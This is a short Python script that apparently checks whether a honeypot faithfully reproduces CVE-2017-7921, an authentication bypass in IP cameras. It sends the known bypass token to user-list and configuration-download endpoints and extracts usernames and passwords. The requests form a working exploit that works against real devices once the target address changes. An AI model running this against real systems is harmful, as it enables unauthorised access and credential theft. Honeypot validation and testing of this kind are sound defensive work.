#!/usr/bin/env python3
import sys
import re
import requests

target_url = "http://localhost:8080"
auth_token = "YWRtaW46MTEK"

print("[*] CVE-2017-7921 - Advisory-Accurate Test")
print("[*] Target: " + target_url)

session = requests.Session()

# Test 1: Authentication bypass (advisory-confirmed)
print("\n[*] Test 1: /Security/users authentication bypass")
resp = session.get(target_url + "/Security/users?auth=" + auth_token, timeout=10)

# Check ONLY for fields documented in advisory
if resp.status_code == 200 and 'userName' in resp.text and 'userLevel' in resp.text:
    print("[+] PASS: Authentication bypass successful")
    usernames = re.findall(r'<userName>([^<]+)</userName>', resp.text)
    passwords = re.findall(r'<password>([^<]+)</password>', resp.text)
    print(f"[+] Extracted {len(usernames)} user(s)")
else:
    print("[-] FAIL: Authentication bypass")
    sys.exit(1)

# Test 2: Config file download (advisory-confirmed)
print("\n[*] Test 2: /System/configurationFile download")
resp = session.get(target_url + "/System/configurationFile?auth=" + auth_token, timeout=10)

if resp.status_code == 200 and len(resp.content) > 0:
    print(f"[+] PASS: Config downloaded ({len(resp.content)} bytes)")
else:
    print("[-] FAIL: Config download")
    sys.exit(1)

print("\n[+] All advisory-confirmed endpoints working")
print("[+] CVE-2017-7921 honeypot is advisory-accurate")
sys.exit(0)
